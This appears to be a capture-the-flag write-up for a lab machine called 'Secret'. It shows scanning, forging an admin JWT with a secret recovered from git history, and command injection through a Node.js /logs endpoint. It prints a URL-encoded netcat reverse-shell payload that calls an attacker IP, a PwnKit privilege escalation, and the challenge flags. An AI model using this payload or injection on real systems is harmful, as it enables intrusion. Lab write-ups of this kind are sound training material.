# Secret

As always let's start with `nmap`

```console
$ sudo nmap -Pn -n -sS -sV -T4 10.10.11.120
Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-27 00:13 CET
Nmap scan report for 10.10.11.120
Host is up (0.082s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
3000/tcp open  http    Node.js (Express middleware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

On port `80` we have this page

![](2022-02-27-00-17-50.png)

With `gobuster` we can scan for some hidden pages

```console
$ gobuster -u http://10.10.11.120 -w common.txt

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.11.120/
[+] Threads      : 10
[+] Wordlist     : common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2022/02/27 00:17:22 Starting gobuster
=====================================================
/api (Status: 200)
/assets (Status: 301)
/docs (Status: 200)
/download (Status: 301)
=====================================================
2022/02/27 00:17:53 Finished
=====================================================
```

From download we can get the source code, but there are so many files...let's skip that for the moment

In the docs page we see that there are some APIs, so let's try so make some requests

![](2022-02-27-00-55-27.png)

![](2022-02-27-00-56-52.png)

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjFhYzIwY2Q4ZGFkZjA0NWQ1YzM0OWUiLCJuYW1lIjoibWFyY29vIiwiZW1haWwiOiJtYXJjb0BtYXJjby5pdCIsImlhdCI6MTY0NTkyMDg2Mn0.YKnCIvtVb5vIJwvnDWc1TnVuiUZq3FSHKDbs-_lxD1A
```

![](2022-02-27-00-59-00.png)

Not too much information...maybe we can try to see if we can get an admin account

The token is encoded with jwt

![](2022-02-27-01-00-25.png)

No other things to try here, let's return to the source code

Inside `public > routes` we can find all the api endpoints we have already tested plus one, `/logs`

```js
router.get('/logs', verifytoken, (req, res) => {
    const file = req.query.file;
    const userinfo = { name: req.user }
    const name = userinfo.name.name;
    
    if (name == 'theadmin'){
        const getLogs = `git log --oneline ${file}`;
        exec(getLogs, (err , output) =>{
            if(err){
                res.status(500).send(err);
                return
            }
            res.json(output);
        })
    }
    else{
        res.json({
            role: {
                role: "you are normal user",
                desc: userinfo.name.name
            }
        })
    }
})
```

It seems like that we can execute some commands, so let's try to register a user with `theadmin` as name

![](2022-02-27-01-13-10.png)

Nothing to do...so maybe we can try to edit the jwt token of our user and change the name to `theadmin`. For doing that we need some secret to verify the signature. Inside the `.env` file we have somethings

```
DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
TOKEN_SECRET = secret
```

Let's try with 

![](2022-02-27-01-18-39.png)

![](2022-02-27-01-18-58.png)

Opening the folder with vscode reveals that there is a git repository, let's try too see if there is some older version of this `.env` file

![](2022-02-27-01-20-27.png)

![](2022-02-27-01-21-08.png)

```
gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
```

Let's use this as secret

![](2022-02-27-01-21-44.png)

![](2022-02-27-01-22-08.png)

Very nice! Now we can return to the `/logs` endpoint

![](2022-02-27-01-23-57.png)

Never used js, so let's break down the code with the help of Google

Ok, so it seems like that `req.query.file` take the http parameters, so we can add `?file=<somethings>` and try to see if we can execute some commands

![](2022-02-27-01-28-12.png)

Now we can get the user flag

![](2022-02-27-01-33-25.png)

#### **USER OWN >>** `d9cf42ee9c1439b92d75bea07051b85f`

NICE!! Now let's open a reverse shell and continue

```
rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f%7Csh%20-i%202>&1%7Cnc%2010.10.16.68%209005%20>/tmp/f
```

```console
$ nc -lvnp 9005
Listening on 0.0.0.0 9005
Connection received on 10.10.11.120 49668
sh: 0: can't access tty; job control turned off
$ whoami
dasith
```

First let's start with a LinPEAS scan

![](2022-02-27-12-34-29.png)

Let's find ad exploit for this

https://github.com/berdav/CVE-2021-4034

![](2022-02-27-12-39-48.png)

#### **SYSTEM OWN >>** `e0fc9fc0572c5d630caea4065e919ff0`